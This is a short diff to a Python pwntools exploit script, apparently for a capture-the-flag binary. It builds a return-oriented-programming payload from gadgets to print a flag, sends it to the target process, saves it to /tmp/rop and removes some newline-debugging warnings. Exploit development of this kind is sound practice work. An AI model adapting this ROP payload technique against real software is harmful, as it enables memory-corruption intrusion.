@@ -53,19 +53,11 @@ gogo += buf + secondpart + f + pad
 # print global
 gogo += buf + gadget_poprdi + flag_global + call_puts
 
-if gogo.count(b'\n'):
-    log.warn("payload contains a newline, but it should not. Payload may fail")
-    n = len(gogo.split(b'\n')[0])
-    log.warn(f"payload is {len(gogo)} long. newline found at offset {n}")
-    log.warn(f"this means newline is in the part {int(n/64+1)} of the payload (index {n/64})")
-    log.warn(f"payload around newline: {gogo[n-10:n+10]}")
-
 p.sendline(gogo)
 
 
 with open("/tmp/rop", "wb") as f:
     f.write(gogo)
 
-print(p.recvall())
-# p.recvuntil("PoC")
-# log.success("PoC" + p.recvline().decode())
+p.recvuntil("PoC")
+log.success("PoC" + p.recvline().decode())
